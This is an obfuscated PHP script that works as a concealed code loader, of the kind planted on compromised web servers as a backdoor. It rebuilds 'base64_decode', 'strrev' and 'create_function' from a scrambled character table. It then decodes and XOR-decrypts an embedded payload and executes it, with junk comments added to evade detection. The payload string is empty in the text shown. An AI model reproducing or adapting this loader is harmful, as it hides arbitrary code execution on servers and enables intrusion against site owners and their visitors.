<?php  


 function H68Ym($zU4dj, $vjk4t = '') { $MMUDQ = $zU4dj; $lqg94 = ''; for ($yhuyh = 0; $yhuyh < strlen($MMUDQ);) { for ($ApiAU = 0; $ApiAU < strlen($vjk4t) && $yhuyh < strlen($MMUDQ); $ApiAU++, $yhuyh++) { $lqg94 .= $MMUDQ[$yhuyh] ^ $vjk4t[$ApiAU]; } } return $lqg94; }
/*CCTHjWqKfNepoFUQiFYcMqbtxSpHpPyiMmOQMPYVOBlqPdntpyqVlsfpcQSsNwnvQpDsiayAqJlLkUzqpLBhEOdDBhpwfwWcNLloyGTzLkezyeFGjrGNRDUmTSFTqQzc*/

$zuComkVz941 = "b3vmji017wzre/pa(8f_odc4*lx)nkqg6hu52yt;9.s";
$RPZmFGTu8672 = "";
$uLOyEHFM6284 = "";
$mGBBEaJL7670 = "";
foreach([0,15,42,12,32,23,19,21,12,22,20,21,12] as $C){
   $uLOyEHFM6284 .= $zuComkVz941[$C];
}
foreach([42,38,11,11,12,2] as $C){
   $mGBBEaJL7670 .= $zuComkVz941[$C];
}

/*DBNEHFgRafRGGIEqWrFNXMEofXOLuEVwoLinKXoCjuxhHFxuDKwfWoiJkvSVsLkjRowqHJoHlcXcBWjQexiSPkGyjnOAjltqokEMwPjggdrqqGOHxDNYCzXGbyFxUgvQ*/

$C = $mGBBEaJL7670('n'.''.''.''.''.'o'.'i'.''.'t'.''.'c'.'n'.''.''.'u'.'f'.''.'_'.'e'.''.''.'t'.''.'a'.'e'.''.''.''.''.'r'.''.'c'.''.''.''.'');
$t = $C("/*PMPDlZbV7152*/", $uLOyEHFM6284( H68Ym($uLOyEHFM6284($RPZmFGTu8672), "WpoVSdBK2696")));
$t();

/*FAGBgoWYVyEXXKnRLdlxihhiNdoPztrKPkBKIgEjDmKYyhGuSWDqHkldsbRzXagXTnqnfseOfuKsTYSrSjOCaFjsRsoDobPDQJYjvXzNBVEghiYHMPTinuaajdEbzvsD*/